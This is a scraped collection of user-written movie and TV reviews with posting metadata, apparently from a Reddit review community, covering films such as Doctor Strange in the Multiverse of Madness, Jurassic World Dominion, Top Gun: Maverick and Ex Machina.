That fun being gross, dark, and a little violent, or at least as much as you can expect from a Marvel movie. All of this is made possible by famed gross out director Sam Raimi, known for his excellent early 2000s Spider-Man films and the enduringly popular Evil Dead series, which are a clear influence on this Dr. Strange sequel. Hopefully the employment of his distinctive directing style is a portent of things to come for Marvel, that is handpicking more interesting flavors of director rather than just shoehorning someone bland enough to blend into the sterile film language the Russo brothers put down. 

Now don’t worry, you won’t feel adrift watching Multiverse of Madness. It doesn’t feel disconnected from the mainline entries in terms of tone or what happens except it definitely gets a free pass to murder whomever it pleases since it mostly takes place in a different dimension. And that may be the movie’s greatest fault, it’s lack of impact beyond some decent entertainment. It’s beholden to the limitations of the Marvel formula even as it tries to go full Raimi, from smirk worthy call back one liners to sort of generically decent choreography and sequence design. When it breaks loose for some real creative fun, it’s all welcome but bittersweet as you know it all go back into the bottle like a genie before all the wishes have come true, politely handing the baton off to the next installment. But let’s get stuck into the nitty gritty of what works and what doesn’t.

**CHARACTERS AND STORY**

The story set up is pretty straight forward. New character America Chavez is the hinge upon which the whole narrative turns as she has the power to travel between universes and has become the target of those who wish to extract her power and use it for evil ends. She runs into Dr. Strange and he’s dragged into making sure she’s protected. Now because trailers don’t give away who the actual villain is that wants to use America’s powers, I’ll leave that a mystery here as well, but just know that it makes sense if you’ve kept up with the cinematic canon to date and introduces a pretty cool conflict as we go.

The script’s one of the weakest so far both in terms of plotting and actual dialogue. Cumberbatch’s one of the bright spots of the movie as he’s there to break up the hokey self-seriousness of several scenes not merely to induce a laugh. He provides clearheadedness and assurance that he’s the cool guy with a plan. I don’t really buy his romance with perennial cool lady Rachel McAdams because her part is so written so blandly and unfortunately this what if we could romance keeps cropping up like it matters but there’s just no chemistry or depth presented. 

Aside from the very good performance from the best Olsen sister as the Scarlet Witch, the other side characters are pretty boilerplate too, constantly acting like boring straight men who badger Strange for his riskiness while they offer no other alternative and thus need Strange’s creativity. 

As for the actual plot, macguffins are introduced and told to be impossible to reach or find or use and then we hear “oh but I totally found it or got it” and it takes all the wind out of the fun when nothing symbolizes anything other than the arbitrary goal. There’s even this shoehorned flashback scene where characters learn very convenient sob stories so they can understand each other better because there’s a mindreading machine in one of the dimension’s they’re traveling through. Y’know, cuz writing an actual conversation would be tough. 

Anyway, if it sounds like I’m being negative, it’s mostly because the first half of the movie which is all set up, is just really going through the motions. Once the movie gets the pieces in play and starts ramping up the ghoulishness and playing with new ideas, like how dreams are actually visions of your alternate selves in other dimensions, it starts to get really fun. 

Evil Dead is an obnoxiously clear influence, from the doors slamming, to eyes turning blank and countenances darkening. It’s never truly horrific but it does get pretty creepy looking and fairly gross. Then characters start dying right and left until Strange realizes he has to dig deep and pull off a very creative and macabre spell to save the day. I can’t spoil it here but suffice to say, it’s not only really cool conceptually but looks incredible.

**SPECIAL EFFECTS**

The special effects overall are excellent. There are really gnarly little details and fluid animation everywhere, from disembodied evil spirits flooding the screen to various supernatural monsters like the octopus that just brims with clarity and realism. There’s one section on a monitor that shows the Scarlet Witch fucking shit up and the animation quality was so bad I thought I was watching a video game but everything else is pristine, some of the best I’ve ever seen. The octopus creature is exquisitely detailed and the later sections where evil spirits are summoned and controlled is just so flarkin’ cool, and I’m so glad I don’t have the footage here to spoil that for you. I also have to commend one of the most creatively goofy and excellent fight scenes ever put in a Marvel film where characters are slinging spells at each other with the gimmick that they’re essentially animating the notes off the sheet music on a nearby piano. Obviously, this is all flavor but it’s so creative and fun to see play out, and I really encourage more distinctive choices like this in the future.

So that’s my spoiler free Dr. Strange in the Multiverse of Madness review. It’s one of the weaker written entries in the franchise with melodramatic dialogue about macguffins that don’t even end up mattering to the plot at all, and forced romances, and all this, but once Raimi leans into his obsession with the undead, the 2nd half of the movie redeems itself and it becomes so beautiful to look at, so fun to experience, and so refreshing in terms of the tedium of the sort of generic cosmic heroing we see everywhere else, I couldn’t help but come out the other side with a positive opinion of this one. And hey, this movie even has a universe where Captain Marvel is likeable. Ok, she actually still kinda sucks here, but at least she’s not, y’know.

So go see Multiverse of Madness. It’s a little creaky but it has a fun villain, great effects, and a real sense of fun and liveliness that’s to be encouraged in forthcoming Marvel movies. Excelsior!",moviereviews,6945,1199,98,0
1654873469.0,Jurassic World Dominion | A Worthy End To The Era??,"[Full Version Here.](

 Picking up four years after the destruction of dinosaur island, humans have mostly gotten used to dinosaurs living alongside them all over the world. Except when a new company claims to be offering sanctuary for these creatures, things are not as they seem, and their ulterior motives and shady dealings are threatening millions once again.  

The formula for these movies are all the same. Some slight megalomanic with way too much money or funding does shady things with dinosaur DNA and threatens everything for profit. And then it's up to a small team of scientists and a macho man to save the people and the dinosaurs.

This kind of felt like a paint by numbers action movie. The main character tries to live a quiet life until something gets taken from him. Then there's just one action sequence after another as they chase down their target. But luckily, routine action pieces are always made better by throwing dinosaurs into the mix.

Everything about his film just kind of felt very middle of the line. There were a lot of good actors but nothing spectacular about any of their performances. I don't think it was through any fault of the actors, the writing just didn't seem to be on part with the previous two movies.

But the lack of any single performance was made up for with the return of the previous trilogy's veteran characters in this one.

I will never complain about Jeff Goldblum on screen although he was just slightly less entertaining this time around. He really wasn't the main character in either of the storylines, so maybe he just didn't get enough dialogue for him to feel like his usual over witty self. But he did manage to get a couple of good lines in.

Laura Dern just looked happy to be back on screen with some dinosaurs. And that's all I really needed from her.

And I'm lowkey always happy to see BD Wong of course as Wu. He is the epitome of that famous Jeff Goldblum quote. (your scientist were so busy wondering if they could, they never thought about if they should). I've never really thought of him as the real bad guy, just a scientist too obsessed with his work, until he realizes just how far he's taken it. And I like how he finally got a sliver of redemption after almost 40 years of bad decisions.

And of course, no Jurassic movie is ever really complete without a t-rex showdown. And I'm starting to wonder how the t-rex keeps winning against increasingly more powerful dinosaurs.

Was it the most exciting movie from the franchise? Not really. The wow factor kind of wares off this many movies in. But was it bad or even boring by any standards? Not really either. There were some really fun moments in the movie like the Malta scenes. And a cute baby dinosaur running through snow will put a smile on everyone's face.

While the trilogy may not end up going out with a bang, this was a decent end to this era of Jurassic movies. And it is definitely still worth the watch.",moviereviews,2951,529,59,0
1654866691.0,Jurassic World Dominion (2022): 10-Category Review,"Jurassic World: Dominion misses its opportunity. The story is needlessly convoluted, sidelining the dinosaurs (and their release) for a mediocre corporate scheme. There are multiple narratives that don't intertwine until the third act. Jokes misfire, plot points are convenient, and motivations are flimsy. Action sequences are messy and unrealistic, defusing their suspense. There are cheesy one-liners, lame fan service attempts, and inept villains. Still, the biggest issue is the missing protagonist or theme. Dominion is overstuffed, with no primary message. Plus, the actors are dull, especially Pratt. Only Goldblum is any fun. Overall, Dominion is emotionally draining and cluttered.

Technically, Dominion is inconsistent. There are abundant animatronics, but the CGI is occasionally goofy. Reuniting the original cast is impressive, but less charming when they're past their primes. The cinematography uses decent lighting, angles, and extended shots. However, the sound coasts off of the originals without adding anything new. There is generic music, impersonal production design, and scattered direction. Tonally, Dominion attempts everything and lands very little. Lastly, the editing is bloated, boring, and unfocused. The film never gains momentum and feels like a chore. Whether it's excessive exposition, contrived drama, or numbing action, Dominion isn't engaging.

1654272170.0,Top Gun: Maverick - A Worthwhile Sequel,"[Full Version Here.](

Top Gun: Maverick picks up after more than thirty years since the events of Top Gun. Now, having burned all of his bridges in the navy, he's given one last lifeline; return to train the newest group of top aviators or be grounded from flying fighter jets ever again.

Tom Cruise hasn't lost a beat. Even in-universe, over 30+ years of flying the fastest airplanes ever made has barely aged him. And he's even still got the same disobedient nature to him as well. I think what really highlighted that was Ice Man's progression from the end of the original to now, which also makes complete sense for his character as well.

But the one who really surprised me was Miles Teller as Rooster. This was just as much a story about him stepping up as it was about Maverick stepping back. And it was amazing to see just how much he was able to resemble Goose. There were some shots where I could swear that just for a moment, I was looking at a young Anthony Edwards again.

I don't think that his and Maverick's got properly resolved, but it did get close enough to justify their reconciliation.

And I would like to see the story of how these new pilots came to know each other. They've all got some sort of history together, and I think that would've been interesting to see. Although I do understand why that portion of their lives was skipped over, as it would've probably just felt like a remake of the original Top Gun story where all these young pilots compete in the program.

And speaking of that, I love how they decided not to make this into just a modern remake of the classic, but actually a continuation of the previous story for some of the characters while bringing in some new ones and keeping the style and vibe of the original. In fact, this may be one of the few sequels that manages to resemble the original  so closely without feeling like an attempt at simply recreating the original. But it does still have a nice amount of callbacks and nostalgia.

And the action, was right on par with the original as well. The flying sequences are so much fun to watch, especially the dogfighting. That last dogfight was absolutely insane, and maybe one of the best ariel action sequences I can remember. And the fact that most of it was done in actual planes is just all the more incredible.

It's a great movie all the way around. Whether you're a veteran who appreciated the original, a boomer who grew up obsessed with everything about it, or a new-comer who's never even seen it, I think this movie evokes the same feeling of awe and wonder as the first; which credits to the everyone involved, because that's not an easy thing to do.",moviereviews,2665,486,58,0
1654006215.0,Star Wars: Revenge of the Sith (2005): 10-Category Review,"Revenge of the Sith fittingly concludes a disastrous trilogy. Although it has a protagonist arc, its writing remains abysmal. The tone is erratic, dialogue is blunt, character choices are confusing, and the narrative is needlessly convoluted (a flaw worsened by the prequel's predictable nature). Specifically, side characters and plotlines are unproductive filler. Really, this story should've focused on Anakin's unraveling, allowing him to evolve naturally. Instead, he's consistently angsty and deprioritized behind illogical politics. Thus, Anakin's descent is faint and the script is disengaging. Despite centering around a downfall, Revenge of the Sith fails to emotionally connect.

Meanwhile, familiar technical issues continue. Revenge of the Sith has some cinematic lighting and composition, but its visuals are predominantly stale. Dream sequences provide insert edits and abstract sounds, but they're sparse. Fundamentally, Revenge of the Sith presents minimal effort and basic craft. The production design remains sterile, the atmosphere lacks detail, and the pacing is monotonous. Plus, CGI overuse is still distractingly obnoxious. Clearly, the goal was merchandising, not artistry. Therefore, Revenge of the Sith is predictable, apathetic, and pointless. Ultimately, there's more entertainment in a single scene of the original trilogy than this entire film.

1653657147.0,Top Gun: Maverick (2022): 10-Category Review,"Top Gun: Maverick is a flawed improvement. Its story is straightforward, which works. Maverick has one last mission, his relationship with Goose's son is complex, and his romance has baggage. None of this is inventive, but it's enough to fuel the climax. However, Top Gun: Maverick changes paths and loses steam. A dramatic peak is nicely set up, yet the film backtracks on that, introducing a new layer to the mission. This second climax is action-packed, but also fatiguing and muddied. Had Top Gun: Maverick kept its bittersweet climax, it would've been more meaningful. Instead, its emotional mediocrity feels like a missed opportunity.

Meanwhile, Top Gun: Maverick has solid filmmaking. First, visuals are polished (utilizing focus, lighting, and mounts), acting meets the material, and the tone is clear. The soundtrack balances nostalgia, and the production is authentic. Plus, the editing employs montages, dissolves, and energetic action. Next, the sound design mirrors emotions, using symbolic echoes, silence, and J-cuts. Finally, the effects are the star of Top Gun: Maverick because its stunts are impossibly real. Overall, Top Gun: Maverick advances its drama and thrills, but still lacks a core message. Unfortunately, without a conscious theme, it feels like war glorification.

1653398609.0,"South Park: Bigger, Longer and Uncut (1999): 10-Category Review","South Park: Bigger, Longer and Uncut is deceptively insightful. While many will hate the film, its awareness is admirable. Specifically, it's about parents overreacting to a vulgar movie. Since South Park garnered similar uproars, this plot is clearly satire. Beyond being meta, South Park champions themes of censorship, scapegoating, and violence. Essentially, it's social commentary, showing that responses to vulgar media can be more destructive than the vulgarity itself. Since South Park is harmless (besides some outdated slurs), its backlash was misguided. Ultimately, South Park simultaneously advocates for free speech while testing its boundaries. Thus, it deserves credit.

Meanwhile, South Park has witty craft. First, its simplistic animation is endearing and iconic. Ironically, this earlier art style is more appealing than its sleeker evolutions. Next, the sound, editing, and visuals utilize overheads, crossfades, and silence for comedic effect. Plus, the pacing is active and the sound is engaging. Lastly, the music is the surprise highlight of the movie. South Park is an unlikely musical, providing multiple original hits that are still relevant parts of pop culture. Overall, South Park is a polarizing experience that will evoke reactions from all viewers. Some will detest it, others will find it hilarious, but nobody will be bored.

1652879381.0,Ex Machina (2015): 10-Category Review,"Ex Machina is peak minimalist sci-fi. Thought experiments through futurism is everything science fiction is about. Plus, its contained nature allows Ex Machina to delicately elaborate on characters, themes, and psychological dilemmas. The film is rarely flashy, but it's captivating because it strikes viewers on the deepest level: their consciousness. Beyond its meditations on creation, morality, and control, Ex Machina is ignited by electric performances. Gleeson is an evolving lead, Isaac brilliantly masks callousness behind wit, and Vikander is a vivid union of humanity and technology. Together, they're an elevated whirlwind of exceptional material. Viewers will undoubtedly grow from this experience.

Meanwhile, the filmmaking of Ex Machina is elegant. The cinematography uses physical distortions, lighting, and composition to subtly convey meaning. The editing is slow-paced, allowing dialogue to breathe. The production design is sleek, yet grounded. The special effects are elaborate but never overbearing, always supporting the narrative. The sound design gives the film symbolic climaxes and a polished tone. Finally, the direction unites everything into a potent mood of longing. Longing for freedom, connection, or meaning, Ex Machina is a quiet storm of cohesive reflection. Overall, this is a film that leaves a lasting impression.

1652187946.0,Fear and Loathing in Las Vegas (1998): 10-Category Review,"Fear and Loathing in Las Vegas is a singular experience. Surreal, uncomfortable, and insightful, it seemingly endorses depraved behavior but actually addresses significant issues. First, by openly embracing its bias, Fear and Loathing highlights the honesty missing from supposedly objective journalism. Next, Fear and Loathing examines the exclusivity of the American Dream as its protagonists continually return to horrific escapism, attempting to cope with that harsh reality. They prefer drug-induced nightmares to political ones. Ultimately, Fear and Loathing suggests that drug culture is an unfortunate response to social climates, the underbelly of systemic corruption.

Technically, Fear and Loathing is a visceral force, creating a psychedelic atmosphere with numerous tactics. Dutch angles, low angles, wide lenses, and rocking motions twist every shot. Echoes distort sound, jump cuts disjoint editing, and various effects (CGI, green screens, projections, and prosthetics) enhance hallucinations. Plus, lighting and frame rates are exaggerated. Truly, Fear and Loathing parades abstract techniques. Furthermore, the relevant music amplifies emotional states, and Depp naturally captures layers of discontent and disregard with his voice and physicality. Overall, Fear and Loathing is a unique perspective and a special work of art.

My review for Doctor Strange and the Multiverse of Madness will come at a later date, but Darkman is a movie I enjoyed, it has it’s faults, mainly because of the CGI not holding up thirty years later. But Darkman balances the campiness of comic books with a grittier story but doesn’t bog the viewer down in the reality.

1651935791.0,Doctor Strange in the Multiverse of Madness Review,"WOW... Uhh, this movie was a lot.

NOTE: I saw like 2 video reviews of this movie and I forgot what opinions came from which videos but some opinions I saw were what I used in this review. I think they were 3C films and Troyoboyo17.

I think that this movie was definitely a Doctor Strange movie even though Scarlet Witch did definitely take a lot of the emotion and purpose of the story into her arc. I think that Strange realizing that he can't get the girl is actually a very interesting idea. I think that Strange having to know what's best for not only himself and his girlfriend (I'm just gonna call her Rachel cause that's the actresses name and I forgot the character's) was very good and a little heartbreaking. A question asked through this movie was ""Are you happy?"" I liked the idea of a character that's gone through as many things as Strange has, being asked such a question.

People say this was a horror movie... I think there were some ""spooky"" moments but this is no more a horror movie than Shaun of the Dead. I fuckin love Shaun of the Dead.

The Illuminati was... interesting. My brother and I have an ongoing joke about the multiverse ideas in movies like Michael Keaton in the new Flash movie, Andrew Garfield and Tobey Maguire in No Way Home, and we call them Member Berries. It's from South Park and a basic synonym for Member Berries is nostalgia. The Illuminati was nostalgia. Now, I'm not gonna act high and mighty. I loved Andrew and Tobey's return and I loved Patrick Stewart's yellow hover chair with that faint X-Men theme playing. I enjoyed it but a part of me felt like I wasn't watching a movie in which a story was happening and presenting itself well. I felt like I was watching a bad PSA on drugs where an old man dresses like a skater with a hat turned sideways, yellow overalls, and he starts saying racial slurs and starts misusing teenage terminology. It felt odd and forced but Disney's best tools isn't it's writers, it's their FUCKIN MEMBER BERRIES!

Now, to the character's I actually felt the most about. John Krasinski as Mr Fantastic. A lot of people like this idea while a lot don't and I'm kinda in the middle. I lean towards liking him because I think he can nail the look and I think he can fit a father role, especially after seeing A Quiet Place but I do understand that Mr Fantastic and Lee Abbott are a little different. I don't know if Krasinski can pull of that genius role but I do wanna see if he get's another chance. Then... BLACK BOLT!!!!!!! YAAAAAHHHHH, I'm fuckin stoked to see Black Bolt. I'm not even the biggest Black Bolt fan. I just think he's a really cool character and after hearing how shitty his Inhuman's show was... I felt sad. But then, he appears with his badass costume and attitude! Loved it.

And while I was happy to see these characters, they got fuckin butchered. I was so sad seeing Black Bolt's head explode and Mr Fantastic getting torn apart like string cheese. Patrick Stewart getting his head snapped got me. I think showing us these characters and then destroying them was a bit like ""Alright, alright, Kevin. I get it.  I don't know where the MCU is going."" 

The ending of this whole movie was a bit rushed. I feel like Sam Raimi is a great director and I definitely feel like he directed this but I also feel like Disney must've controlled this movie a little to much.  It's a weird fuckin movie... I've honestly gotten tired making this review.

1650374087.0,The Outfit (2022): 10-Category Review,"In the franchise era, The Outfit is refreshing for its contained story. Also, its bottled nature amplifies details and thrills, building tension through shifting characters. Everyone has a secret and every conversation has ulterior motives. Each scene is unpredictable and it's unclear who viewers can trust, making The Outfit thoroughly captivating. The narrative gets improbable and the ending is convenient, but overall, the writing deserves credit for weaving efficient conflicts. Furthermore, the acting (especially Deutch and Rylance) is deceptively layered, igniting the script's strengths and softening its flaws. Therefore, despite The Outfit's plot holes, it's highly riveting.

Meanwhile, The Outfit's craft maintains excitement. Bottle movies depend on filmmaking for entertainment weight, and The Outfit delivers. Particularly, the editing keeps tensions high and the runtime concise. Plus, the timeline manipulations are flavorful and symbolic. Next, the music accents the era, the sound is dramatic, and the direction provides a consistent tone. Lastly, the cinematography utilizes lighting and composition, the production is immersive, and the effects meet the material. These aspects aren't elaborate, but they're meaningful. Ultimately, The Outfit is balanced, with key performances and a tight script. It's not a blockbuster, but it's firmly enjoyable.

1650077205.0,Choose or Die review,"Man, this movie was a real heartbreak for me. Saw the trailer on YouTube and was so excited for the premiere date on Netflix. Watched it on day one. Sadly, Netflix really dropped the ball with this one. Started off with a great idea/premise, a gruesome baby of Saw meets Oregon Trail. Then, somewhere in the middle, the film falls off a cliff of messy storytelling and boring scenes. The final battle was pretty cool conceptually though. The final scenes try to tie everything together, but it just falls flat. Somewhere after the beginning, the film loses its edge and any scariness it has. A great concept lost in terrible execution. Combine that with a wasted cameo by horror icon Robert Englund and this film is not only a Netflix dud but a crime against horror films.",moviereviews,772,137,18,0
1649856995.0,Harry Potter and the Deathly Hallows - Part 1 (2010): 10-Category Review,"The Deathly Hallows: Part 1 doesn't commit. After Half-Blood Prince's wholly brooding yet beautiful atmosphere, it seemed like the Potterverse had evolved. However, Deathly Hallows: Part 1 relapses because it isn't fundamentally driven by emotions. Despite its bleak narrative, it's an adventure with tonally inconsistent solutions. That rocky blending of lightheartedness with maturity is a key downgrade. Plus, Deathly Hallows: Part 1 is an incomplete episode because it lacks an ending. No core themes or issues are resolved. Some will forgive that since it's a series, but all films should have individualized conclusions (early Potterverse is a great example). 

Similarly, The Deathly Hallows: Part 1 is technically proficient but not peak Potterverse. Particularly, despite pretty establishing shots, the visuals are missing suggestive composition and angle variety. The editing has effective smash inserts, but an unnecessary runtime. Also, the production is a step down due to Hogwarts' absence. Conversely, the music matches the prospective mood, the elaborate effects are complimentary, and the sound symbolically builds tension. Plus, the cast is more comprehensive. Overall, The Deathly Hallows: Part 1 is well crafted and surely a positive experience. It's just not the best that the Potterverse has to offer.

1649771322.0,Harry Potter and the Half-Blood Prince (2009): 10-Category Review,"Harry Potter and the Half-Blood Prince is peak Potterverse. It fully accepts its darker tone, bringing harmony to the experience. The technicals remain strong (possibly the strongest yet), the writing is consistent, and the acting is noticeably vulnerable. The theme is focused, the loss is genuinely painful, and the storylines converge neatly. Its ending feels slightly incomplete because the story isn't a standalone, but that's forgivable since everything else is effectively written. Plus, Rickman and Felton are layered, Gambon shows pain, and Radcliffe delivers a ranged performance. A welcome departure from its lighthearted beginnings, Half-Blood Prince embraces itself.

Meanwhile, Half-Blood Prince is technically skilled. Overall, it's the filmmaking culmination of the series. The visuals use framing, motion, composition, color, angles, and focus to produce an artistic mood. The effects and production are powerfully immersive. The editing is efficient and occasionally stylish (though some transitions needed establishing shots). Also, the sound is atmospheric and abstract. Lastly, the music highlights the melancholy tone and mystical reality. In ways, this is the most impressive Harry Potter film because it's so cohesive. Merging art with entertainment, Harry Potter and the Half-Blood Prince should please all audiences.

1649680270.0,The Adjustment Bureau (2011) movie review,"This is a neat film that I’m shocked hasn’t squeezed out a bad sequel or remade into a television series for a streaming service. Matt Damon plays a politician in this movie, I watched this when it first came out on Sky movies all those years ago and it holds up. Mainly because they spend time developing the characters, the adjustments are more of a backdrop to the relationship as opposed to being the only interesting idea in the movie. The movie is based off a Philip K. Dick novel, it shouldn’t surprise me that it’s such a well ironed out idea as Dick has inspired and produced a long list of science fiction novels and could be considered one of the best storytellers of modern fiction.

1649287968.0,Bridgeton First Season Review,"Today, let’s talk about “Bridgerton”, but the first season, this one is when Gossip Girl and Downton Abbey combine to become a salacious affair. The lives of 1813 London’s high society have shaken off the expected gilded etiquette to showcase an even more competitive and deceptive side. Based on the novels by Julia Quinn, the Netflix show adapts the book series and expands it even further into a must-watch drama. With refined costumes, opulent settings, and torrid love affairs, Bridgerton packs a powerful punch!

Bridgerton focuses on the lives of competing wealthy families in London’s high society. Framed around the debut of the Bridgerton family’s eldest daughter Daphne (Phoebe Dynevor), the series explores several threads of how the Bridgerton children deal with life during the season as debutantes are brought to court. The matches being made, the mind games to build (or destroy) pairings, the secret hook-ups hiding in the shadows, everything is on the table in their pursuit to land a perfect match. Rounding out the stories include the Featheringtons’ growing troubles during the season, Lady Danbury’s (Adjoa Andoh) mission to get the Duke of Hastings (Regé-Jean Page) engaged, and the Queen’s (Golda Rosheuvel) invested interest in making this an entertaining debutante season.

In addition to the festivities, there is the looming threat of Lady Whistledown, a mysterious writer releasing scandalous articles about London’s wealthy and elite. A various point throughout the season, Lady Whistledown comments about the developments during the parties, events, and “she” plays an important role in how high society views potential scandals. Some of Bridgerton’s most shocking revelations and plot developments come at the hands of Lady Whistledown, and uncovering the mysterious writer is a juicy mystery that pulls you in.

One of Bridgerton’s strengths comes from the visual appeal. Bridgerton is designed head-to-toe in period outfits and sets to suit the era of the story. A lot of detail is put into the series to make it feel grand and opulent (I would be shocked at the budget for the series!). And, many modern touches are incorporated that are adapted for the time, like adapting current popular music into orchestral songs for the parties and dances. For example, there’s a beautiful rendition of Ariana Grande’s “Thank U, Next” that is used for one of the first dances between Daphne and the Duke of Hastings. These choices feel fresh and add an unconventional spin to the era.

And we can’t talk about Bridgerton without mentioning the salacious sex appeal. Bridgerton incorporates the occasional sex scene and nudity to shake things up and play off the taboo nature within London’s high society. While surprising in parts, the inclusion didn’t feel unnecessary or added for the sheer shock value alone. Here, Bridgerton utilizes those uninhibited scenes to reflect how their characters are going against their societal expectations or when they’ve unleashed themselves from their refinement. And when they do, the characters act more primetime soap than daytime.

Daphne’s story has the most weight and progression; her debutante season affects the surrounding characters, whether it be her family, her friends, or her suitors. The tale of a pair lying about their romantic pursuits to hook in other matches has been done to death in other TV shows/movies, and while the idea is a bit cliché, the chemistry between her and the Duke of Hastings is so powerfully captivating. You can’t help but root for something to develop between them — they’re electric whenever they’re throwing playful barbs at one another. No one compared to their chemistry; their journey is a strong story to follow.

The same goes for Lady Danbury’s involvement. Adjoa Andoh stole the show whenever she was on-screen; she commanded attention and you could tell she had a lot of fun playing the sharp-witted matchmaker. The Queen and the Dowager Viscountess Bridgerton (Ruth Gemmell) also lived for their roles too – while both are vastly different, they take to debutante season quickly and enjoyably.

The first season of Netflix’s Bridgerton delivered a deliciously fun time full of British refinement and soapy scandals. The plots hooked us in and the characters kept us coming back for more. With the exception of a few glaring holes and missteps, the season shined as a whole. It is not a secret that we are overusing the inclusivity in the majority of the modern productions, however, this series select the characters in a way it is not uncomfortably forced to watch. Well done this time Netflix.

1648733249.0,Everything Everywhere All at Once (2022): 10-Category Review,"Everything Everywhere All at Once is stunning. It's a corky spectacle, but remains deeply vulnerable. The narrative follows Evelyn, whose business and personal relationships are failing. Plus, Evelyn is unexpectedly tasked with saving the entire multiverse as her personal life bursts. This story might sound familiar, but it develops into an unparalleled blend of comedy, action, adventure, and drama. Each role is compelling, the conflict is relatable, the arcs are earned, and the plot devices are utilized to their fullest. Furthermore, the entire cast displays a wide range of skills: switching characters, blending tones, and striking beats in a symphony of emotions.

Meanwhile, Everything Everywhere All at Once is masterfully crafted. Motion, lighting, colors, framing, and focus make every shot engaging and meaningful. The sound symbolically conveys psychology through silence, volume, and echoes. The multifaceted effects contribute to the ambitious atmosphere. Similarly, the production design is boundless, yet united by a lighthearted vision. Lastly, the editing is a powerhouse, jumping between several timelines, yet synergizing perfectly. Overall, Everything Everywhere All at Once is marvelous because it fuses so much into a cohesive experience. In other hands, it would be a mess, but Everything Everywhere All at Once works beautifully.

1648301007.0,The Eyes of Tammy Faye (2021): 10-Category Review,"The Eyes of Tammy Faye is confidently produced and brilliantly performed. Its straightforward story highlights corruption and prejudice without feeling heavy-handed. Plus, this script delicately balances its characters. The Eyes of Tammy Faye portrays its protagonists with flawed humanity, allowing viewers to conclude for themselves. Still, this film's driving force is its acting. Cherry Jones is good (evolving her internal conflict), Andrew Garfield is great (masking insecurities with bravado), and Jessica Chastain is electric (blending inner strength, devout faith, and mounting pain). Undoubtedly, these three (especially Chastain) transformed a solid movie into a true event.

Meanwhile, The Eyes of Tammy Faye is well crafted. Montages can be shortcuts, but these purposefully convey information, atmosphere, and artistry. The sound design is muted during emotional moments, expressing Tammy Faye's isolation. The music recontextualizes gospel, juxtaposing Tammy Faye's celebrity success and personal struggles. Also, the cinematography employs camerawork, framing, and focus to keep the film fresh. Lastly, the production design elaborately carries the audience through eras with detailed sets, costumes, prosthetics, and make-up. Overall, The Eyes of Tammy Faye is a thorough film with noticeable strengths, making it well worth a watch.

I originally put this off, because I’d just seen the The Taking of Pelham 123 with Denzel Washington and John Travolta. I enjoyed both films but they do include similar themes, both involving trains and traffic control systems. Unstoppable is a great movie, and adds a lot of shaky camera and camera cuts to heighten the drama.

1647871072.0,X (2022): 10-Category Review,"X is a stylish homage, embodying 70s filmmaking with risque content, methodical pacing, and purposeful presentation. The story follows a group of pornographers who rent a cabin from a strange elderly couple. The script consistently builds tension but reserves horror for the end. Instead, the beginning focuses on characters and eerie atmosphere. Consequently, the characters are interesting. Each perspective contributes to the narrative, the dialogue is cleverly meta, and there are themes about sexual repression and the fleeting nature of beauty. These themes aren't fully realized, but still matter. Thus, the writing feels occasionally shallow but, overall, has substance.

Technically, X shines. The cinematography uses film (rather than digital), extreme long shots, overheads, push-ins, and surreal lighting to heighten the mood. Abstract sound punctuates messages and emotions. Match cuts and stuttered editing emphasize connection between scenes. The music is era appropriate, including a perfect use of Don't Fear The Reaper. The naturally grungy production design sells the time period. The effects are vivid and impactful. Also, the casting of the old woman is both surprising and thematic. Ultimately, X is skillful and attempts to elevate its genre. It doesn't completely succeed but still excels as a sharp experience.

1647615523.0,Fresh (2022): 10-Category Review,"Fresh is a flashy thriller. The story follows a young woman struggling with dating. She meets a charming man, but he isn't what he seems. Then, the plot takes extreme turns that are shockingly uncomfortable. Female objectification is examined, but that theme isn't fully prioritized or paid off. This social commentary is admirable, but its inconsistent follow through feels like an afterthought. Thus, the writing has good intentions but is primarily cheap excitement. Conversely, the acting is magnetic. Edgar-Jones shows stunning range, and Stan exhibits compelling charisma. Therefore, Fresh provides vivid emotions yet questionable substance, which will get mixed reactions.

Technically, however, Fresh is crystal clear. The film is energetic because the cinematography uses motion, framing, and focus to convey engaging messages. Plus, the sound is frequently symbolic, the editing is dynamic, and the catchy soundtrack is juxtaposition. The production design is simple but ominously chic. The effects could be more visceral but get the job done. Lastly, the direction deserves credit for the overall creative style, even if the tone is slightly uneven. Ultimately, Fresh pairs vibrant filmmaking with enough substance to make it a worthy experience. Some viewers might dislike its intensity, but everyone should respect its craft.

1647266924.0,The Adam Project (2022): 10-Category Review,"The Adam Project is a waste of time. Its sci-fi premise of a time traveler teaming up with his younger self is fun, but that positive is overshadowed by formulaic MacGuffins, empty drama, and forced quippy dialogue. Likewise, Ryan Reynolds shows vulnerabilities, yet mostly plays his typical sarcastic self. That snarky humor can work in the right situations, but becomes grating when overused. Furthermore, Garner, Saldana, and Ruffalo all provide some emotion, but their smaller roles come with strained comedy as well. Overall, The Adam Project has some heart and creativity, but not nearly enough for audiences to actually care.

Meanwhile, The Adam Project's filmmaking is generic. The cinematography has moments of lighting, focus, and framing, but is mostly unimaginative. Similarly, the editing is never interesting and the sound is rarely elevated. The music uses recognizable songs, but they aren't related to the material on screen. Plus, the production design is painfully unoriginal and the excessive CGI is cheap (making the film look like a Syfy original). Clearly, the priority of The Adam Project was its famous cast, since that's the only reason the film is relevant. Ultimately, it might have glimmers of potential, but The Adam Project does nothing worth watching.

1647189020.0,Soul (2020): 10-Category Review,"Soul is a spiritual journey. Using metaphorical plot points to represent abstract concepts, this film is intentional animation. Pixar is known for familiar narratives in strange places, but Soul uses that tactic to its fullest. Superficially, Soul is about a man stuck in purgatory, trying to return to his life. Viewers see various afterlife realms and meet diverse spirits. However, in reality, Soul is about the beauty of life and its everyday miracles. Soul utilizes these creative writing devices to emphasize a powerful message about living life to the fullest. Combining unique imagination with mighty emotions, Soul delivers a striking story.

Meanwhile, Soul's filmmaking is colorfully artistic. First, the music weaves fitting jazz on earth with its ethereal sythwave in heaven. Because music is central to the plot, this suggestive pattern is potent. Next, the production design is unique. Earth has Pixar's usual look, but heaven is symbolic and surreal. Plus, sound design is manipulated for emotional impact, graphics are stylistically detailed, and insert editing strengthens themes. Lastly, the direction balances the lighthearted tone with deeply spiritual ideas, while also orchestrating figurative set pieces. Overall, Soul has inspired craft and important meaning, making it a memorable treat.

